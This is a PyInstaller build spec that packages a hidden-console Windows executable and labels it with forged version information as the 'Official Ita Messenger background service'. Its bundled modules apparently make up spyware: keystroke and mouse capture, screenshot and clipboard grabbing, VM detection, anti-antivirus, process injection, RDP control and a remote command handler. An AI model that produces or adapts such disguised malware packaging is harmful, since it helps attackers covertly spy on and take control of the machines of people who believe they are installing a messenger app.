# -*- mode: python ; coding: utf-8 -*-
import os
import sys
from PyInstaller.utils.hooks import collect_all, collect_data_files
from PyInstaller.utils.win32.versioninfo import (
    VSVersionInfo, FixedFileInfo, StringFileInfo, StringTable,
    StringStruct, VarFileInfo, VarStruct
)

block_cipher = None

# تعریف version info
version_info = VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 1, 0, 1),
    prodvers=(1, 1, 0, 1),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo([
      StringTable(
        '040904B0',
        [
          StringStruct('CompanyName', 'Ita Messenger Corporation'),
          StringStruct('FileDescription', 'Ita Messenger Background Service'),
          StringStruct('FileVersion', '1.1.0.1'),
          StringStruct('InternalName', 'ItaMessengerService'),
          StringStruct('LegalCopyright', 'Copyright 2024 Ita Messenger Corporation. All rights reserved.'),
          StringStruct('OriginalFilename', 'ItaMessengerService.exe'),
          StringStruct('ProductName', 'Ita Messenger'),
          StringStruct('ProductVersion', '1.1.0.1'),
          StringStruct('Comments', 'Official Ita Messenger background service for system integration.'),
        ]
      )
    ]),
    VarFileInfo([VarStruct('Translation', [0x409, 1200])])
  ]
)

def get_hidden_imports_and_data():
    hidden_imports = [
        'keyboard', 'pynput', 'pynput.keyboard', 'pynput.mouse', 
        'pynput._util', 'pynput._util.win32',
        'pyautogui', 'PIL', 'PIL.Image', 'PIL.ImageGrab', 'PIL._imaging',
        'psutil', 'psutil._pswindows', 'pyperclip',
        'win32api', 'win32con', 'win32process', 'win32security', 'win32file',
        'win32service', 'win32serviceutil', 'win32event', 'win32evtlog', 
        'win32evtlogutil', 'win32gui', 'win32ui', 'pywintypes', 'winreg',
        'requests', 'urllib3', 'certifi', 'ssl', 'socket',
        'cryptography', 'cryptography.hazmat', 'cryptography.hazmat.primitives',
        'cryptography.hazmat.primitives.ciphers', 
        'cryptography.hazmat.primitives.ciphers.algorithms',
        'cryptography.hazmat.primitives.ciphers.modes', 
        'cryptography.hazmat.backends',
        'cryptography.hazmat.backends.openssl', 
        'cryptography.hazmat.primitives.padding',
        'dotenv', 'packaging', 'packaging.version', 'json', 'base64', 'hashlib',
        'system.file_manager', 'system.collector', 'system.vm_detector', 
        'system.anti_av', 'system.process_injector',
        'monitoring.logger', 'monitoring.rdp_controller', 
        'network.communicator', 'encryption.manager', 'commands.handler',
        # اضافه کردن ماژول‌های ضروری برای requests و urllib3
        'http', 'email', 'email.mime', 'email.mime.text', 'email.mime.multipart',
        'email.mime.base', 'email.mime.nonmultipart', 'email.encoders',
        'urllib3.packages.six', 'urllib3.packages.ssl_match_hostname',
        'urllib3.contrib', 'urllib3.contrib.pyopenssl',
    ]
    
    datas = []
    binaries = []
    
    for package in ['cryptography', 'PIL', 'pynput', 'certifi']:
        try:
            pkg_datas, pkg_binaries, pkg_hidden = collect_all(package)
            datas.extend(pkg_datas)
            binaries.extend(pkg_binaries)
            hidden_imports.extend(pkg_hidden)
        except Exception as e:
            print(f"Warning: Could not collect data for {package}: {e}")
    
    return hidden_imports, datas, binaries

hidden_imports, additional_datas, additional_binaries = get_hidden_imports_and_data()

# اضافه کردن manifest به datas
if os.path.exists('manifest.xml'):
    additional_datas.append(('manifest.xml', '.'))

a = Analysis(
    ['main.py'],
    pathex=[],
    binaries=additional_binaries,
    datas=additional_datas,
    hiddenimports=hidden_imports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[
        # فقط ماژول‌های غیرضروری رو exclude کن
        'tkinter', 'unittest', 'xmlrpc', 'pydoc', 'doctest',
        'multiprocessing', 'concurrent', 'test', 'lib2to3', 'distutils',
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
    optimize=2,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='ItaMessengerService',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='icon.ico' if os.path.exists('icon.ico') else None,
    version=version_info,
)
